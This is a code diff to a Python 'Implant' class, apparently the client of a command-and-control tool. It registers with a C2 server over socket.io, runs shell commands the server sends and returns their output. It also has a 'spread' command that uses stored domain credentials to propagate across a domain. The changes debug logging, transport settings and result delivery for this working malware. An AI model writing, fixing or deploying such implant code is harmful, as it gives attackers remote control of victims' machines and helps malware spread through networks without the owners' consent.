@@ -42,14 +42,16 @@ class Implant:
         self.domain_password = domain_password
         self.implant_id = str(uuid.uuid4())
         
-        # Configure socket.io client with WebSocket transport
+        # Configure socket.io client
         self.sio = socketio.Client(
             reconnection=True,
             reconnection_attempts=5,
-            transport='websocket',
             logger=True,
             engineio_logger=True
         )
+        
+        # Set transport after initialization
+        self.sio.transport = 'websocket'
         
         self.command_queue = queue.Queue()
         self.running = True
@@ -83,15 +85,20 @@ class Implant:
             if data.get('status') == 'success':
                 logger.info("Successfully registered with C2 server")
             else:
-                logger.error("Registration failed")
+                logger.error(f"Registration failed: {data}")
                 self.sio.disconnect()
         
         @self.sio.on('command')
         def on_command(data):
             command = data.get('command')
-            if command and data.get('implant_id') == self.implant_id:
-                logger.info(f"Received command: {command}")
+            implant_id = data.get('implant_id')
+            logger.info(f"Received command event: {data}")
+            
+            if command and implant_id == self.implant_id:
+                logger.info(f"Processing command for this implant: {command}")
                 self.command_queue.put(command)
+            else:
+                logger.warning(f"Ignoring command - implant_id mismatch or missing command. Received: {data}")
     
     def register(self):
         """Register with the C2 server"""
@@ -160,8 +167,9 @@ class Implant:
                     return "Command timed out after 30 seconds"
                 
         except Exception as e:
-            logger.error(f"Command execution failed: {e}")
-            return f"Error executing command: {str(e)}"
+            error_msg = f"Error executing command: {str(e)}"
+            logger.error(error_msg)
+            return error_msg
     
     def handle_upload(self, filename):
         """Handle file upload to implant"""
@@ -301,40 +309,55 @@ class Implant:
         while self.running:
             try:
                 command = self.command_queue.get(timeout=1)
-                logger.info(f"Executing command: {command}")
+                logger.info(f"Processing command from queue: {command}")
                 
                 try:
                     if command == "spread":
+                        logger.info("Executing spread command")
                         result = self.spread_to_domain()
                     else:
+                        logger.info(f"Executing command: {command}")
                         result = self.execute_command(command)
+                    
+                    # Ensure result is a string
+                    if not isinstance(result, str):
+                        result = str(result)
+                    
+                    # Log the result before sending
+                    logger.info(f"Command result (length: {len(result)}): {result[:200]}...")
                     
                     # Send result back to C2 server
                     if self.connected:
-                        self.sio.emit('command_result', {
+                        result_data = {
                             'implant_id': self.implant_id,
                             'command': command,
                             'result': result,
                             'timestamp': datetime.now().isoformat()
-                        })
-                        logger.info(f"Command result sent: {command}")
+                        }
+                        logger.info(f"Sending command result to C2 server: {result_data}")
+                        self.sio.emit('command_result', result_data, callback=self._on_result_sent)
                     else:
                         logger.error("Cannot send command result: Not connected to C2 server")
                 except Exception as e:
-                    logger.error(f"Error executing command {command}: {e}")
+                    error_msg = f"Error executing command {command}: {str(e)}"
+                    logger.error(error_msg)
                     if self.connected:
                         self.sio.emit('command_result', {
                             'implant_id': self.implant_id,
                             'command': command,
-                            'result': f"Error executing command: {str(e)}",
+                            'result': error_msg,
                             'timestamp': datetime.now().isoformat()
-                        })
+                        }, callback=self._on_result_sent)
             except queue.Empty:
                 continue
             except Exception as e:
                 logger.error(f"Command worker error: {e}")
                 time.sleep(1)  # Prevent tight loop on error
-    
+
+    def _on_result_sent(self, *args):
+        """Callback for when command result is sent"""
+        logger.info(f"Command result sent successfully: {args}")
+
     def start(self):
         """Start the implant"""
         try:
@@ -342,7 +365,6 @@ class Implant:
             logger.info(f"Connecting to C2 server at {self.c2_url} using WebSocket transport")
             self.sio.connect(
                 self.c2_url,
-                transports=['websocket'],
                 wait_timeout=10
             )
             
@@ -377,7 +399,6 @@ class Implant:
             if not self.sio.connected:
                 self.sio.connect(
                     self.c2_url,
-                    transports=['websocket'],
                     wait_timeout=10
                 )
         except Exception as e:
